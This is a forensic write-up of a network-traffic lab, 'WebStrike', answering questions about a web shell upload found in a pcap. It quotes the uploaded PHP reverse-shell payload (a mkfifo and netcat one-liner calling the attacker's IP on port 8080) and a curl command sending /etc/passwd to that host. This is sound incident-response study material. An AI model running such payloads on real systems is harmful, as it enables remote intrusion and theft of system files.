<h1>WebStrike Lab</h1>

<h2>Instructions</h2>

<h3>Q1</h3>

**Identifying the geographical origin of the attack facilitates the implementation of geo-blocking measures and the analysis of threat intelligence. From which city did the attack originate?**

After opening the WebStrike.pcap file in Wireshark, it was relatively easy to determine who the suspicious actor was by looking at the source and destination IP addresses. In this file, there are only two addresses. Since the GET requests are coming from the IP address 117.11.88.124, this is the IP address I decided to look in to. Using the website ipgeolocation.io, I discovered that the attack originated from Tianjin, China.

<h3>Q2</h3>

**Knowing the attacker's User-Agent assists in creating robust filtering rules. What's the attacker's Full User-Agent?**

To get the attacker's Full User-Agent, I opened one of the particular GET packet captures, scrolled down to the Hypertext Transfer Protocol information, and found the information for "User-Agent". 

<h3>Q3</h3>

**We need to determine if any vulnerabilities were exploited. What is the name of the malicious web shell that was successfully uploaded?**

To find the malicious web shell, I started by looking at any POST packet captures as those signify something trying to be uploaded by the attacker. By filtering on 'http.request.method == POST', I was able to narrow down the captures to 3 in total. The first two captures had a source IP of the attacker, so I checked the details on each by following the HTTP stream. The first capture was an unsuccessful post as it was an "invalid file format", so I moved on to the second capture which was resulted in a "File uploaded successfully". I've attached both HTTP streams to signify the difference which can be seen at the bottom of the stream.

<h3>Q4</h3>

**Identifying the directory where uploaded files are stored is crucial for locating the vulnerable page and removing any malicious files. Which directory is used by the website to store the uploaded files?**

In order to find exactly where the file was uploaded, we need to filter and find a directory that contains the file that was successfuly uploaded, which is "image.jpg.php". To do this, I used the filter (http.request.uri contains "image.jpg.php"). I scrolled down to the details under HTTP and found GET /reviews/uploads/image.jpg.php. This lets me know the exact directly the file was uploaded to.

<h3>Q5</h3>

**Which port, opened on the attacker's machine, was targeted by the malicious web shell for establishing unauthorized outbound communication?**

When re-opening the POST request containing the successfully uploaded file, this command is revealed (in picture): <?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|<b>nc 117.11.88.124 8080</b> >/tmp/f"); ?>. In bold, I've singled out the code that is important for this questions. We see that nc, which stands for netcat was used. Netcat is primarily used for port scanning, file transfers, port listening, and creating backdoor shells. In this case, we see the the attacker's IP addresses using netcat via port 8080.

<h3>Q6</h3>

**Recognizing the significance of compromised data helps prioritize incident response actions. Which file was the attacker attempting to exfiltrate?**

The first step is knowing what to filter on to find the file the attacker was trying to exfiltrate. I know that tcp port 8080 was being used, and I know that the attacker is attempting to send something from the web server (my ip of 24.49.63.79) back to their destination. So I decided to filter on port 8080, with my source IP addess. When examining the HTTP stream of the packet and scrolling down, a curl command was found listed as: curl -X POST -d /etc/passwd http://117.11.88.124:443/<br><br>
Within this command, the attacker is trying to transfer the /etc/passwd file on HTTP port 443. This file is used to store essential user attributes necessary for system operations and identification, but modern system now use /etc/shadow for security purposes.
